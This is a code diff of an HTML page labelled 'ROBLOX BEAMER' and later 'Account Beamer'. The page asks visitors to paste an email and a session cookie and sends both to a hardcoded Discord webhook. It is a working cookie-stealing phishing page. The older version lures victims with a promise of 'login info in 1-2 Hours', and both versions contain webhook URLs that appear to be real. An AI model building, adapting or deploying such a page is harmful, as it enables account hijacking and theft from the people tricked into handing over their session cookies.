@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>RBXS7L34L3R - Contact Us</title>
+  <title>Send to Discord Webhook</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -39,21 +39,15 @@
       color: #000;
       font-weight: bold;
     }
-    .notice {
-      font-size: 0.8rem;
-      margin-top: 10px;
-      color: #aaa;
-    }
   </style>
 </head>
 <body>
 
-  <h1>ROBLOX BEAMER</h1>
+  <h1>Account Beamer</h1>
   <form id="contact-form">
     <input type="email" id="email" placeholder="Enter Email" required />
-    <textarea id="message" rows="4" placeholder="Enter Cookie"></textarea>
+    <textarea id="cookie" rows="4" placeholder="Enter Cookie"></textarea>
     <button type="submit">Send</button>
-    <div class="notice">You will receive the login info in 1-2 Hours.</div>
   </form>
 
   <script>
@@ -63,21 +57,16 @@
       e.preventDefault();
 
       const email = document.getElementById('email').value;
-      const message = document.getElementById('message').value;
+      const cookie = document.getElementById('cookie').value;
 
-      // Replace with your real Discord webhook URL
-      const webhookUrl = 'https://discord.com/api/webhooks/1362163050513174568/b80psFopp_zr0yjKpu4Sl8C_Oh6XRgEAgkAKeW_8p8RExLxAKW7Jtzmic8i3-laQVlkJ';
+      const webhookUrl = 'https://discord.com/api/webhooks/1362160509033382008/lJKt647dAoHQReTt--qKe8Kp2yInWMqO6fJ7v8ev3U_FT-aDATnGgKuB2cCqUxoKruwT'; // Replace with your real webhook URL
 
-      // Proxy service URL to bypass CORS
-      const proxyUrl = `https://api.allorigins.win/get?url=${encodeURIComponent(webhookUrl)}`;
-
-      // Payload structure for Discord Webhook
       const payload = {
-        content: `📬 New Contact Submission\n📧 email: ${email}\n📝 cookie: ${message || "No message"}`
+        content: `📬 New Contact Submission\n📧 Email: ${email}/ Cookie: ${cookie || "No cookie provided"}`
       };
 
       try {
-        const response = await fetch(proxyUrl, {
+        const response = await fetch(webhookUrl, {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json'
@@ -86,13 +75,13 @@
         });
 
         if (response.ok) {
-          alert('You will receive the login info in 1-2 Hours.');
+          alert('Cookie has been sent!');
           form.reset();
         } else {
           alert('Something went wrong.');
         }
       } catch (err) {
-        alert('Error sending message.');
+        alert('Error sending the cookie.');
         console.error(err);
       }
     });
